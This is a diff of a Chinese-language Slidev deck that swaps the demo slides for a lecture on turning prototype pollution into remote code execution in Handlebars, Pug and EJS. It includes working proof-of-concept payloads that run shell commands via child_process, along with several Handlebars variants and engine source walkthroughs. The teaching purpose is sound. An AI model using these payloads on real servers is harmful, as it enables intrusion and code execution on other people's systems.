@@ -23,6 +23,8 @@ mdc: true
 
 Mix
 
+<PoweredBySlidev mt-10 />
+
 <div class="abs-br m-6 text-xl">
   <a href="https://github.com/mnixry" target="_blank" class="slidev-icon-btn">
     <carbon:logo-github />
@@ -503,564 +505,812 @@ Object.assign({}, obj).username;
 </v-clicks>
 
 ---
-transition: slide-up
-level: 2
+layout: two-cols-header
 ---
 
-# Navigation
+### 利用模板引擎和原型链污染达成 RCE
 
-Hover on the bottom-left corner to see the navigation's controls panel, [learn more](https://sli.dev/guide/ui#navigation-bar)
+Web 开发中，模板引擎是一种用于生成 HTML 的工具。它将模板和数据结合起来，以创建可复用的视图组件。
 
-## Keyboard Shortcuts
+::left::
 
-|                                                    |                             |
-| -------------------------------------------------- | --------------------------- |
-| <kbd>right</kbd> / <kbd>space</kbd>                | next animation or slide     |
-| <kbd>left</kbd> / <kbd>shift</kbd><kbd>space</kbd> | previous animation or slide |
-| <kbd>up</kbd>                                      | previous slide              |
-| <kbd>down</kbd>                                    | next slide                  |
+<v-clicks>
 
-<!-- https://sli.dev/guide/animations.html#click-animation -->
+- [EJS](https://ejs.co/)
 
-<img
-  v-click
-  class="absolute -bottom-9 -left-7 w-80 opacity-50"
-  src="https://sli.dev/assets/arrow-bottom-left.svg"
-  alt=""
-/>
-
-<p v-after class="absolute bottom-23 left-45 opacity-30 transform -rotate-10">Here!</p>
-
----
-layout: two-cols
-layoutClass: gap-16
----
-
-# Table of contents
-
-You can use the `Toc` component to generate a table of contents for your slides:
-
-```html
-<Toc minDepth="1" maxDepth="1" />
+```js
+const ejs = require("ejs"); // 引入EJS模块
+const template = `
+  <h1>Hello, <%= name %>!</h1>
+`; // 定义模板
+const data = { name: "John" };
+const html = ejs.render(template, data); // 渲染模板
+console.log(html);
 ```
 
-The title will be inferred from your slide content, or you can override it with `title` and `level` in your frontmatter.
+- [Pug](https://pugjs.org/)
+
+```js
+const pug = require("pug"); // 引入Pug模块
+const template = `
+  h1 Hello, #{name}!
+`; // 定义模板
+const compiledTemplate = pug.compile(template); // 编译模板
+const data = { name: "John" };
+const html = compiledTemplate(data); // 渲染模板
+console.log(html);
+```
+
+</v-clicks>
 
 ::right::
 
-<Toc text-sm minDepth="1" maxDepth="2" />
+<v-clicks>
 
----
-layout: image-right
-image: <https://cover.sli.dev>
----
+- [Handlebars](https://handlebarsjs.com/)
 
-# Code
-
-Use code snippets and get the highlighting directly, and even types hover!
-
-```ts {all|5|7|7-8|10|all} twoslash
-// TwoSlash enables TypeScript hover information
-// and errors in markdown code blocks
-// More at https://shiki.style/packages/twoslash
-
-import { computed, ref } from "vue";
-
-const count = ref(0);
-const doubled = computed(() => count.value * 2);
-
-doubled.value = 2;
+```js
+const handlebars = require("handlebars"); // 引入Handlebars模块
+const template = `
+  <h1>Hello, {{name}}!</h1>
+`; // 定义模板
+const compiledTemplate = handlebars.compile(template); // 编译模板
+const data = { name: "John" };
+const html = compiledTemplate(data); // 渲染模板
+console.log(html);
 ```
 
-<arrow v-click="[4, 5]" x1="350" y1="310" x2="195" y2="334" color="#953" width="2" arrowSize="1" />
-
-<!-- This allow you to embed external code blocks -->
-
-<<< @/snippets/external.ts#snippet
-
-<!-- Footer -->
-
-[Learn more](https://sli.dev/features/line-highlighting)
-
-<!-- Inline style -->
-<style>
-.footnotes-sep {
-  @apply mt-5 opacity-10;
-}
-.footnotes {
-  @apply text-sm opacity-75;
-}
-.footnote-backref {
-  display: none;
-}
-</style>
-
-<!--
-Notes can also sync with clicks
-
-[click] This will be highlighted after the first click
-
-[click] Highlighted with `count = ref(0)`
-
-[click:3] Last click (skip two clicks)
--->
+</v-clicks>
 
 ---
-level: 2
+layout: two-cols-header
 ---
 
-# Shiki Magic Move
+#### 模板引擎的工作原理
 
-Powered by [shiki-magic-move](https://shiki-magic-move.netlify.app/), Slidev supports animations across multiple code snippets.
+::left::
 
-Add multiple code blocks and wrap them with <code>````md magic-move</code> (four backticks) to enable the magic move. For example:
+<v-clicks>
 
-````md magic-move {lines: true}
-```ts {*|2|*}
-// step 1
-const author = reactive({
-  name: "John Doe",
-  books: [
-    "Vue 2 - Advanced Guide",
-    "Vue 3 - Basic Guide",
-    "Vue 4 - The Mystery",
-  ],
-});
+![alt text](./images/normal-template-engine.png)
+
+- 词法分析：将模板字符串转换为 Token 流
+- 语法分析：将 Token 流转换为 AST 树
+- 编译：将 AST 转换为可执行的函数
+- 执行：执行模板函数，生成 HTML
+
+</v-clicks>
+
+::right::
+
+<v-clicks>
+
+![alt text](./images/abnormal-template-engine.png)
+
+- 但是，如果存在原型链污染，则可以随意修改 AST 树，进而影响生成的代码，最终达到远程代码执行的目的
+
+</v-clicks>
+
+---
+
+#### Handlebars PoC
+
+<v-clicks>
+
+在开始之前，先看看如何使用 Handlebars 模板引擎。
+
+```js
+const Handlebars = require("handlebars");
+
+const template = Handlebars.compile("Hello {{ msg }}");
+console.log(template({ msg: "posix" })); // Hello posix
 ```
 
-```ts {*|1-2|3-4|3-4,8}
-// step 2
-export default {
-  data() {
-    return {
-      author: {
-        name: "John Doe",
-        books: [
-          "Vue 2 - Advanced Guide",
-          "Vue 3 - Basic Guide",
-          "Vue 4 - The Mystery",
-        ],
-      },
-    };
+`Handlebars.compile` 将字符串转换为模板函数，并传递模板中引用的变量。
+
+```js
+const Handlebars = require("handlebars");
+
+Object.prototype.pendingContent = `<script>alert(origin)</script>`;
+
+const source = `Hello {{ msg }}`;
+const template = Handlebars.compile(source);
+
+console.log(template({ msg: "posix" })); // <script>alert(origin)</script>Hello posix
+```
+
+在这里，我们可以通过原型链污染来影响模板的编译过程。通过插入任意字符串到 `Object.prototype.pendingContent` 中，我们可以确定是否存在原型链污染利用的可能性。
+
+</v-clicks>
+
+---
+
+#### Handlebars PoC 解析
+
+这为什么能工作呢？让我们来深入一下 Handlebars 的[源码](https://github.com/handlebars-lang/handlebars.js/blob/master/lib/handlebars/compiler/javascript-compiler.js)。
+
+```js {all|3-11|13-22|all}{lines:true, maxHeight:'60%'}
+JavaScriptCompiler.prototype = {
+  // ...
+  appendContent: function (content) {
+    if (this.pendingContent) {
+      content = this.pendingContent + content;
+    } else {
+      this.pendingLocation = this.source.currentLocation;
+    }
+
+    this.pendingContent = content;
+  },
+  // ..
+  pushSource: function (source) {
+    if (this.pendingContent) {
+      this.source.push(
+        this.appendToBuffer(
+          this.source.quotedString(this.pendingContent),
+          this.pendingLocation,
+        ),
+      );
+      this.pendingContent = undefined;
+    }
+
+    if (source) {
+      this.source.push(source);
+    }
   },
 };
 ```
 
-```ts
-// step 3
-export default {
-  data: () => ({
-    author: {
-      name: "John Doe",
-      books: [
-        "Vue 2 - Advanced Guide",
-        "Vue 3 - Basic Guide",
-        "Vue 4 - The Mystery",
-      ],
+<v-clicks at="1">
+
+- 通过 `appendContent` 函数，将 `pendingContent` 添加到 `source` 中。
+- 通过 `pushSource` 函数，将 `pendingContent` 设置为 `undefined`，防止 `pendingContent` 被多次插入。
+
+</v-clicks>
+
+---
+
+#### Handlebars RCE 原理 1
+
+<img src="./images/handlebars-execution-flow.png" alt="Handlebars Execution Flow" class="w-2/3 mt-4 mx-auto" />
+
+Handlebars 的工作原理如上图所示。
+
+<v-clicks>
+
+- 在词法分析和语法分析生成 AST 之后，它传递给 `compiler.js`。
+- 我们可以用一些参数运行模板函数，它返回一个字符串，例如 `“Hello posix”`（当 `msg` 为 `posix` 时）。
+
+</v-clicks>
+
+---
+
+#### Handlebars RCE 原理 2
+
+```text {5}{lines:true, maxHeight:'20%'}
+helperName
+  : path -> $1
+  | dataName -> $1
+  | STRING -> {type: 'StringLiteral', value: $1, original: $1, loc: yy.locInfo(@$)}
+  | NUMBER -> {type: 'NumberLiteral', value: Number($1), original: Number($1), loc: yy.locInfo(@$)}
+  | BOOLEAN -> {type: 'BooleanLiteral', value: $1 === 'true', original: $1 === 'true', loc: yy.locInfo(@$)}
+  | UNDEFINED -> {type: 'UndefinedLiteral', original: undefined, value: undefined, loc: yy.locInfo(@$)}
+  | NULL -> {type: 'NullLiteral', original: null, value: null, loc: yy.locInfo(@$)}
+  ;
+```
+
+<v-clicks>
+
+- 在 Handlebars 中，`NUMBER` 类型的节点总是被强制转换为字面量，然后被直接插入到模板的运算结果中。
+- 然而，我们可以通过原型链污染来插入非数字字面量，然后从而得到任意字符串的执行。
+
+```js {all|4-6}{lines:true, maxHeight:'30%'}
+// https://github.com/handlebars-lang/handlebars-parser/blob/a095229e292e814ed9d113d88c827f3509534d1a/lib/parse.js#L13-L50
+export function parseWithoutProcessing(input, options) {
+  // Just return if an already-compiled AST was passed in.
+  if (input.type === "Program") {
+    return input;
+  }
+
+  parser.yy = baseHelpers;
+
+  // Altering the shared object here, but this is ok as parser is a sync operation
+  parser.yy.locInfo = function (locInfo) {
+    return new Helpers.SourceLocation(options && options.srcName, locInfo);
+  };
+
+  let squareSyntax;
+
+  if (typeof options?.syntax?.square === "function") {
+    squareSyntax = options.syntax.square;
+  } else if (options?.syntax?.square === "node") {
+    squareSyntax = arrayLiteralNode;
+  } else {
+    squareSyntax = "string";
+  }
+
+  let hashSyntax;
+
+  if (typeof options?.syntax?.hash === "function") {
+    hashSyntax = options.syntax.hash;
+  } else {
+    hashSyntax = hashLiteralNode;
+  }
+
+  parser.yy.syntax = {
+    square: squareSyntax,
+    hash: hashSyntax,
+  };
+
+  return parser.parse(input);
+}
+```
+
+- 在 `parseWithoutProcessing` 函数中，如果 `input.type` 是 `Program`，即使 `input` 的类型实际上是 `String`，解析器也会认为它已经被 `parser.js` 解析过的 AST 节点，然后直接发送给 `compiler.js` 进行编译。
+
+</v-clicks>
+
+---
+
+#### Handlebars RCE 原理 3
+
+```js {all|4-6|8-10|20-21|38|51-54|63|66-71|64|57-61}{lines:true, maxHeight:'60%'}
+// https://github.com/handlebars-lang/handlebars-parser/blob/a095229e292e814ed9d113d88c827f3509534d1a/lib/visitor.js
+Visitor.prototype = {
+  // ...
+  Program: function (program) {
+    this.acceptArray(program.body);
+  },
+  // ...
+  acceptArray: function (array) {
+    for (let i = 0, l = array.length; i < l; i++) {
+      this.acceptKey(array, i);
+
+      if (!array[i]) {
+        array.splice(i, 1);
+        i--;
+        l--;
+      }
+    }
+  },
+  // ...
+  acceptKey: function (node, name) {
+    let value = this.accept(node[name]);
+    if (this.mutating) {
+      // Hacky sanity check: This may have a few false positives for type for the helper
+      // methods but will generally do the right thing without a lot of overhead.
+      if (value && !Visitor.prototype[value.type]) {
+        throw new Exception(
+          'Unexpected node type "' +
+            value.type +
+            '" found when accepting ' +
+            name +
+            " on " +
+            node.type,
+        );
+      }
+      node[name] = value;
+    }
+  },
+  accept: function (object) {
+    if (!object) {
+      return;
+    }
+
+    /* istanbul ignore next: Sanity code */
+    if (!this[object.type]) {
+      throw new Exception("Unknown type: " + object.type, object);
+    }
+
+    if (this.current) {
+      this.parents.unshift(this.current);
+    }
+    this.current = object;
+
+    let ret = this[object.type](object);
+
+    this.current = this.parents.shift();
+
+    if (!this.mutating || ret) {
+      return ret;
+    } else if (ret !== false) {
+      return object;
+    }
+  },
+  MustacheStatement: visitSubExpression,
+  NumberLiteral: function (/* number */) {},
+};
+
+function visitSubExpression(mustache) {
+  this.acceptRequired(mustache, "path");
+  this.acceptArray(mustache.params);
+  this.acceptKey(mustache, "hash");
+}
+```
+
+```js {all|3|4|4|4|6|6|8-14|10-12|11-12}{lines:true, maxHeight:'30%', at:1}
+const Handlebars = require("handlebars");
+
+Object.prototype.type = "Program";
+Object.prototype.body = [
+  {
+    type: "MustacheStatement",
+    path: 0,
+    params: [
+      {
+        type: "NumberLiteral",
+        value:
+          "console.log(process.mainModule.require('child_process').execSync('id').toString())",
+      },
+    ],
+    loc: {
+      start: 0,
+      end: 0,
     },
-  }),
+  },
+];
+
+const source = `Hello {{ msg }}`;
+const template = Handlebars.precompile(source);
+```
+
+---
+
+#### Handlebars RCE Exploit
+
+```js {all|3-20|22-23}{lines:true, maxHeight:'45%'}
+const Handlebars = require("handlebars");
+
+Object.prototype.type = "Program";
+Object.prototype.body = [
+  {
+    type: "MustacheStatement",
+    path: 0,
+    params: [
+      {
+        type: "NumberLiteral",
+        value:
+          "console.log(process.mainModule.require('child_process').execSync('id').toString())",
+      },
+    ],
+    loc: {
+      start: 0,
+      end: 0,
+    },
+  },
+];
+
+const source = `Hello {{ msg }}`;
+const template = Handlebars.precompile(source);
+```
+
+```js {hide|14-24}{lines:true, maxHeight:'45%'}
+const template = {
+  compiler: [8, ">= 4.3.0"],
+  main: function (container, depth0, helpers, partials, data) {
+    var stack1,
+      lookupProperty =
+        container.lookupProperty ||
+        function (parent, propertyName) {
+          if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
+            return parent[propertyName];
+          }
+          return undefined;
+        };
+
+    return (stack1 = (
+      lookupProperty(helpers, "undefined") ||
+      (depth0 && lookupProperty(depth0, "undefined")) ||
+      container.hooks.helperMissing
+    ).call(
+      depth0 != null ? depth0 : container.nullContext || {},
+      console.log(
+        process.mainModule.require("child_process").execSync("id").toString(),
+      ),
+      { name: "undefined", hash: {}, data: data, loc: { start: 0, end: 0 } },
+    )) != null
+      ? stack1
+      : "";
+  },
+  useData: true,
 };
 ```
 
-Non-code blocks are ignored.
+---
 
-```vue
-<!-- step 4 -->
-<script setup>
-const author = {
-  name: "John Doe",
-  books: [
-    "Vue 2 - Advanced Guide",
-    "Vue 3 - Basic Guide",
-    "Vue 4 - The Mystery",
-  ],
+#### Handlebars RCE Exploit 变种
+
+基本都大差不差。
+
+```js {hide|1-15|17-30|32-48|50-67|69-83|85-113}{lines:true, maxHeight:'80%'}
+// 将 NumberLiteral 替换为 BooleanLiteral
+Object.prototype.body = [
+  {
+    type: "MustacheStatement",
+    params: [
+      {
+        type: "BooleanLiteral",
+        value:
+          "console.log(process.mainModule.require('child_process').execSync('calc.exe').toString())",
+      },
+    ],
+    path: 0,
+    loc: { start: 0 },
+  },
+];
+
+// 将 MustacheStatement 改为 PartialStatement
+Object.prototype.body = [
+  {
+    type: "PartialStatement",
+    name: "",
+    params: [
+      {
+        type: "NumberLiteral",
+        value:
+          "console.log(process.mainModule.require('child_process').execSync('calc.exe').toString())",
+      },
+    ],
+  },
+];
+
+// 将 MustacheStatement 改为 PartialBlockStatement
+Object.prototype.body = [
+  {
+    type: "PartialBlockStatement",
+    params: [
+      {
+        type: "NumberLiteral",
+        value:
+          "console.log(process.mainModule.require('child_process').execSync('calc.exe').toString())",
+      },
+    ],
+    name: 0,
+    openStrip: 0,
+    closeStrip: 0,
+    program: { body: 0 },
+  },
+];
+
+// 将 MustacheStatement 改为 BlockStatement
+Object.prototype.body = [
+  {
+    type: "BlockStatement",
+    params: [
+      {
+        type: "NumberLiteral",
+        value:
+          "console.log(process.mainModule.require('child_process').execSync('calc.exe').toString())",
+      },
+    ],
+    path: 0,
+    loc: 0,
+    openStrip: 0,
+    closeStrip: 0,
+    program: { body: 0 },
+  },
+];
+
+// 触发点和上面的有所差异，这个是在装饰 main 函数的时候插入自定义代码
+Object.prototype.body = [
+  {
+    type: "Decorator",
+    params: [
+      {
+        type: "NumberLiteral",
+        value:
+          "console.log(process.mainModule.require('child_process').execSync('calc.exe').toString())",
+      },
+    ],
+    path: 0,
+    loc: { start: 0 },
+  },
+];
+
+// 无限内嵌 Hash 类型
+Object.prototype.body = [
+  {
+    type: "MustacheStatement",
+    params: [
+      {
+        type: "Hash",
+        pairs: [
+          {
+            value: {
+              type: "Hash",
+              pairs: [
+                {
+                  value: {
+                    type: "NumberLiteral",
+                    value:
+                      "console.log(process.mainModule.require('child_process').execSync('calc.exe').toString())",
+                  },
+                },
+              ],
+            },
+          },
+        ],
+      },
+    ],
+    path: 0,
+    loc: { start: 0 },
+  },
+];
+```
+
+---
+layout: two-cols-header
+---
+
+#### Pug PoC
+
+::left::
+
+<v-clicks>
+
+- 一般使用 Pug 模板引擎的方法如下：
+
+  ```js {*}{lines:true}
+  const pug = require("pug");
+
+  const source = `h1= msg`;
+
+  var fn = pug.compile(source);
+  var html = fn({ msg: "It works" });
+
+  console.log(html); // <h1>It works</h1>
+  ```
+
+- 函数 `pug.compile` 将字符串转换为模板函数，传递模板中引用的对象来生成 HTML。
+
+</v-clicks>
+
+::right::
+
+<v-clicks>
+
+- 以下是一种检测 Pug 模板引擎是否存在原型链污染的方法：
+
+  ```js {*}{lines:true}
+  const pug = require("pug");
+
+  Object.prototype.block = {
+    type: "Text",
+    val: `<script>alert(origin)</script>`,
+  };
+
+  const source = `h1= msg`;
+
+  var fn = pug.compile(source, {});
+  var html = fn({ msg: "It works" });
+
+  // <h1>It works<script>alert(origin)</script></h1>
+  console.log(html);
+  ```
+
+- 当你在 `Object.prototype.block` 中插入 AST 时，编译器会通过 `val` 将其添加到缓冲区中。
+
+</v-clicks>
+
+---
+
+#### Pug PoC 解析
+
+```js {all|14-18}{lines:true, maxHeight:'40%'}
+// https://github.com/pugjs/pug/blob/32acfe8f197dc44c54e8af32c7d7b19aa9d350fb/packages/pug-walk/index.js#L37
+switch (ast.type) {
+  case "NamedBlock":
+  case "Block":
+    ast.nodes = walkAndMergeNodes(ast.nodes);
+    break;
+  case "Case":
+  case "Filter":
+  case "Mixin":
+  case "Tag":
+  case "InterpolatedTag":
+  case "When":
+  case "Code":
+  case "While":
+    if (ast.block) {
+      ast.block = walkAST(ast.block, before, after, options);
+    }
+    break;
+  case "Each":
+    if (ast.block) {
+      ast.block = walkAST(ast.block, before, after, options);
+    }
+    if (ast.alternate) {
+      ast.alternate = walkAST(ast.alternate, before, after, options);
+    }
+    break;
+  case "EachOf":
+    if (ast.block) {
+      ast.block = walkAST(ast.block, before, after, options);
+    }
+    break;
+  case "Conditional":
+    if (ast.consequent) {
+      ast.consequent = walkAST(ast.consequent, before, after, options);
+    }
+    if (ast.alternate) {
+      ast.alternate = walkAST(ast.alternate, before, after, options);
+    }
+    break;
+  case "Include":
+    walkAST(ast.block, before, after, options);
+    walkAST(ast.file, before, after, options);
+    break;
+  case "Extends":
+    walkAST(ast.file, before, after, options);
+    break;
+  case "RawInclude":
+    ast.filters = walkAndMergeNodes(ast.filters);
+    walkAST(ast.file, before, after, options);
+    break;
+  case "Attrs":
+  case "BlockComment":
+  case "Comment":
+  case "Doctype":
+  case "IncludeFilter":
+  case "MixinBlock":
+  case "YieldBlock":
+  case "Text":
+    break;
+  case "FileReference":
+    if (options.includeDependencies && ast.ast) {
+      walkAST(ast.ast, before, after, options);
+    }
+    break;
+  default:
+    throw new Error("Unexpected node type " + ast.type);
+    break;
+}
+```
+
+<v-clicks at="1">
+
+- 当 `ast.type` 为 `While` 时，会调用 `walkAST` 函数，并传入 `ast.block` （如果 `ast.block` 不存在，则会引用原型链上的值）。
+
+- 如果模板中引用了任何来自参数的值，那么 `While` 节点总是存在的，所以这个 PoC 的可信度很高。
+  - 事实上，如果开发者在模板中不引用任何来自参数的值，他们就不会使用任何模板引擎。（那为什么不直接 Serve 静态文件呢？）
+
+</v-clicks>
+
+---
+
+#### Pug RCE 原理 1
+
+<img src="./images/pug-execution-flow.png" alt="Pug Execution Flow" class="w-2/3 mt-4 mx-auto" />
+
+Pug 的工作流程如上图所示。
+
+<v-clicks>
+
+- 不同于 Handlebars，每个过程都被分离成一个单独的模块（monorepo）。
+- Pug 解析器生成的 AST 被传递给 `pug-code-gen` 模块，并生成一个函数。
+- 最后，它将被执行。
+
+</v-clicks>
+
+---
+
+#### Pug RCE 原理 2
+
+```js {*}{lines:true}
+// https://github.com/pugjs/pug/blob/32acfe8f197dc44c54e8af32c7d7b19aa9d350fb/packages/pug-code-gen/index.js#L335-L342
+if (debug && node.debug !== false && node.type !== "Block") {
+  if (node.line) {
+    var js = ";pug_debug_line = " + node.line;
+    if (node.filename)
+      js += ";pug_debug_filename = " + stringify(node.filename);
+    this.buf.push(js + ";");
+  }
+}
+```
+
+在 Pug 的模板编译器中，有一个名为 `pug_debug_line` 的变量，用于存储行号信息。
+
+<v-clicks>
+
+- 如果 `node.line` 存在，则将其添加到缓冲区中，否则将其传递。
+- 对于由 `pug-parser` 生成的 AST，`node.line` 的值总是指定为整数。
+- 但是，我们可以通过 AST 注入将字符串插入 `node.line` 中，从而导致任意代码执行。
+
+</v-clicks>
+
+---
+
+#### Pug RCE Exploit
+
+```js {*}{lines:true}
+const pug = require("pug");
+
+Object.prototype.block = {
+  type: "Text",
+  line: "console.log(process.mainModule.require('child_process').execSync('id').toString())",
 };
-</script>
-```
-````
 
----
+const source = `h1= msg`;
 
-# Components
-
-<div grid="~ cols-2 gap-4">
-<div>
-
-You can use Vue components directly inside your slides.
-
-We have provided a few built-in components like `<Tweet/>` and `<Youtube/>` that you can use directly. And adding your custom components is also super easy.
-
-```html
-<Counter :count="10" />
+var fn = pug.compile(source, {});
+console.log(fn.toString());
 ```
 
-<!-- ./components/Counter.vue -->
-<Counter :count="10" m="t-4" />
+```js {hide|9-19}{lines:true, maxHeight:'50%'}
+function template(locals) {
+  var pug_html = "",
+    pug_mixins = {},
+    pug_interp;
+  var pug_debug_filename, pug_debug_line;
+  try {
+    var locals_for_with = locals || {};
 
-Check out [the guides](https://sli.dev/builtin/components.html) for more.
-
-</div>
-<div>
-
-```html
-<Tweet id="1390115482657726468" />
+    (function (console, msg, process) {
+      pug_debug_line = 1;
+      pug_html = pug_html + "\u003Ch1\u003E";
+      pug_debug_line = 1;
+      pug_html =
+        pug_html + pug.escape(null == (pug_interp = msg) ? "" : pug_interp);
+      pug_debug_line = console.log(
+        process.mainModule.require("child_process").execSync("id").toString(),
+      );
+      pug_html = pug_html + "ndefine\u003C\u002Fh1\u003E";
+    }).call(
+      this,
+      "console" in locals_for_with
+        ? locals_for_with.console
+        : typeof console !== "undefined"
+          ? console
+          : undefined,
+      "msg" in locals_for_with
+        ? locals_for_with.msg
+        : typeof msg !== "undefined"
+          ? msg
+          : undefined,
+      "process" in locals_for_with
+        ? locals_for_with.process
+        : typeof process !== "undefined"
+          ? process
+          : undefined,
+    );
+  } catch (err) {
+    pug.rethrow(err, pug_debug_filename, pug_debug_line);
+  }
+  return pug_html;
+}
 ```
 
-<Tweet id="1390115482657726468" scale="0.65" />
-
-</div>
-</div>
-
-<!--
-Presenter note with **bold**, *italic*, and ~~striked~~ text.
-
-Also, HTML elements are valid:
-<div class="flex w-full">
-  <span style="flex-grow: 1;">Left content</span>
-  <span>Right content</span>
-</div>
--->
-
----
-class: px-20
 ---
 
-# Themes
+#### Ejs RCE
 
-Slidev comes with powerful theming support. Themes can provide styles, layouts, components, or even configurations for tools. Switching between themes by just **one edit** in your frontmatter:
-
-<div grid="~ cols-2 gap-2" m="t-2">
-
-```yaml
----
-theme: default
----
-```
-
-```yaml
----
-theme: seriph
----
-```
-
-<img border="rounded" src="https://github.com/slidevjs/themes/blob/main/screenshots/theme-default/01.png?raw=true" alt="">
-
-<img border="rounded" src="https://github.com/slidevjs/themes/blob/main/screenshots/theme-seriph/01.png?raw=true" alt="">
-
-</div>
-
-Read more about [How to use a theme](https://sli.dev/guide/theme-addon#use-theme) and
-check out the [Awesome Themes Gallery](https://sli.dev/resources/theme-gallery).
-
----
-
-# Clicks Animations
-
-You can add `v-click` to elements to add a click animation.
-
-<div v-click>
-
-This shows up when you click the slide:
-
-```html
-<div v-click>This shows up when you click the slide.</div>
-```
-
-</div>
-
-<br>
-
-<v-click>
-
-The <span v-mark.red="3"><code>v-mark</code> directive</span>
-also allows you to add
-<span v-mark.circle.orange="4">inline marks</span>
-, powered by [Rough Notation](https://roughnotation.com/):
-
-```html
-<span v-mark.underline.orange>inline markers</span>
-```
-
-</v-click>
-
-<div mt-20 v-click>
-
-[Learn more](https://sli.dev/guide/animations#click-animation)
-
-</div>
-
----
-
-# Motions
-
-Motion animations are powered by [@vueuse/motion](https://motion.vueuse.org/), triggered by `v-motion` directive.
-
-```html
-<div
-  v-motion
-  :initial="{ x: -80 }"
-  :enter="{ x: 0 }"
-  :click-3="{ x: 80 }"
-  :leave="{ x: 1000 }"
->
-  Slidev
-</div>
-```
-
-<div class="w-60 relative">
-  <div class="relative w-40 h-40">
-    <img
-      v-motion
-      :initial="{ x: 800, y: -100, scale: 1.5, rotate: -50 }"
-      :enter="final"
-      class="absolute inset-0"
-      src="https://sli.dev/logo-square.png"
-      alt=""
-    />
-    <img
-      v-motion
-      :initial="{ y: 500, x: -100, scale: 2 }"
-      :enter="final"
-      class="absolute inset-0"
-      src="https://sli.dev/logo-circle.png"
-      alt=""
-    />
-    <img
-      v-motion
-      :initial="{ x: 600, y: 400, scale: 2, rotate: 100 }"
-      :enter="final"
-      class="absolute inset-0"
-      src="https://sli.dev/logo-triangle.png"
-      alt=""
-    />
-  </div>
-
-  <div
-    class="text-5xl absolute top-14 left-40 text-[#2B90B6] -z-1"
-    v-motion
-    :initial="{ x: -80, opacity: 0}"
-    :enter="{ x: 0, opacity: 1, transition: { delay: 2000, duration: 1000 } }">
-    Slidev
-  </div>
-</div>
-
-<!-- vue script setup scripts can be directly used in markdown, and will only affects current page -->
-<script setup lang="ts">
-const final = {
-  x: 0,
-  y: 0,
-  rotate: 0,
-  scale: 1,
-  transition: {
-    type: 'spring',
-    damping: 10,
-    stiffness: 20,
-    mass: 2
+```js {*}{lines:true}
+// https://github.com/mde/ejs/blob/cd6817e429c4b1ab40059955968f7ba4b8be64eb/lib/ejs.js#L636-L641
+if (opts.client) {
+  src = "escapeFn = escapeFn || " + escapeFn.toString() + ";" + "\n" + src;
+  if (opts.compileDebug) {
+    src = "rethrow = rethrow || " + rethrow.toString() + ";" + "\n" + src;
   }
 }
-</script>
-
-<div
-  v-motion
-  :initial="{ x:35, y: 30, opacity: 0}"
-  :enter="{ y: 0, opacity: 1, transition: { delay: 3500 } }">
-
-[Learn more](https://sli.dev/guide/animations.html#motion)
-
-</div>
-
----
-
-# LaTeX
-
-LaTeX is supported out-of-box. Powered by [KaTeX](https://katex.org/).
-
-<div h-3 />
-
-Inline $\sqrt{3x-1}+(1+x)^2$
-
-Block
-
-$$
-{1|3|all}
-\begin{aligned}
-\nabla \cdot \vec{E} &= \frac{\rho}{\varepsilon_0} \\
-\nabla \cdot \vec{B} &= 0 \\
-\nabla \times \vec{E} &= -\frac{\partial\vec{B}}{\partial t} \\
-\nabla \times \vec{B} &= \mu_0\vec{J} + \mu_0\varepsilon_0\frac{\partial\vec{E}}{\partial t}
-\end{aligned}
-$$
-
-[Learn more](https://sli.dev/features/latex)
-
----
-
-# Diagrams
-
-You can create diagrams / graphs from textual descriptions, directly in your Markdown.
-
-<div class="grid grid-cols-4 gap-5 pt-4 -mb-6">
-
-```mermaid {scale: 0.5, alt: 'A simple sequence diagram'}
-sequenceDiagram
-    Alice->John: Hello John, how are you?
-    Note over Alice,John: A typical interaction
 ```
 
-```mermaid {theme: 'neutral', scale: 0.8}
-graph TD
-B[Text] --> C{Decision}
-C -->|One| D[Result 1]
-C -->|Two| E[Result 2]
+```js {*}{lines:true}
+const ejs = require("ejs");
+
+Object.prototype.client = "true";
+Object.prototype.escapeFunction = 'function() {console.log("PWNED")}';
+
+const template = "<h2><%= name %></h2>";
+ejs.render(template, { name: "John" }, {});
 ```
 
-```mermaid
-mindmap
-  root((mindmap))
-    Origins
-      Long history
-      ::icon(fa fa-book)
-      Popularisation
-        British popular psychology author Tony Buzan
-    Research
-      On effectiveness<br/>and features
-      On Automatic creation
-        Uses
-            Creative techniques
-            Strategic planning
-            Argument mapping
-    Tools
-      Pen and paper
-      Mermaid
-```
+<v-clicks>
 
-```plantuml {scale: 0.7}
-@startuml
+- 上述 Payload 只对 EJS <= 3.1.9 有效。
 
-package "Some Group" {
-  HTTP - [First Component]
-  [Another Component]
-}
+- 他们在 2019 年的时候觉得这不算洞，不修（[#451](https://github.com/mde/ejs/issues/451)）
 
-node "Other Groups" {
-  FTP - [Second Component]
-  [First Component] --> FTP
-}
+- 然而 2024 年还是做了缓解措施，而且发了 [CVE-2024-33883](https://nvd.nist.gov/vuln/detail/cve-2024-33883)
 
-cloud {
-  [Example 1]
-}
+- 如果能绕过这个缓解措施，我觉得也能拿 CVE 编号，欢迎挑战 \:P
 
-database "MySql" {
-  folder "This is my folder" {
-    [Folder 3]
-  }
-  frame "Foo" {
-    [Frame 4]
-  }
-}
-
-[Another Component] --> [Example 1]
-[Example 1] --> [Folder 3]
-[Folder 3] --> [Frame 4]
-
-@enduml
-```
-
-</div>
-
-Learn more: [Mermaid Diagrams](https://sli.dev/features/mermaid) and [PlantUML Diagrams](https://sli.dev/features/plantuml)
-
----
-foo: bar
-dragPos:
-  square: 691,32,167,_,-16
----
-
-# Draggable Elements
-
-Double-click on the draggable elements to edit their positions.
-
-<br>
-
-###### Directive Usage
-
-```md
-<img v-drag="'square'" src="https://sli.dev/logo.png">
-```
-
-<br>
-
-###### Component Usage
-
-```md
-<v-drag text-3xl>
-  <div class="i-carbon:arrow-up" />
-  Use the `v-drag` component to have a draggable container!
-</v-drag>
-```
-
-<v-drag pos="663,206,261,_,-15">
-  <div text-center text-3xl border border-main rounded>
-    Double-click me!
-  </div>
-</v-drag>
-
-<img v-drag="'square'" src="https://sli.dev/logo.png">
-
-###### Draggable Arrow
-
-```md
-<v-drag-arrow two-way />
-```
-
-<v-drag-arrow pos="67,452,253,46" two-way op70 />
-
----
-src: ./pages/imported-slides.md
-hide: false
----
-
----
-
-# Monaco Editor
-
-Slidev provides built-in Monaco Editor support.
-
-Add `{monaco}` to the code block to turn it into an editor:
-
-```ts {monaco}
-import { ref } from "vue";
-import { emptyArray } from "./external";
-
-const arr = ref(emptyArray(10));
-```
-
-Use `{monaco-run}` to create an editor that can execute the code directly in the slide:
-
-```ts {monaco-run}
-import { version } from "vue";
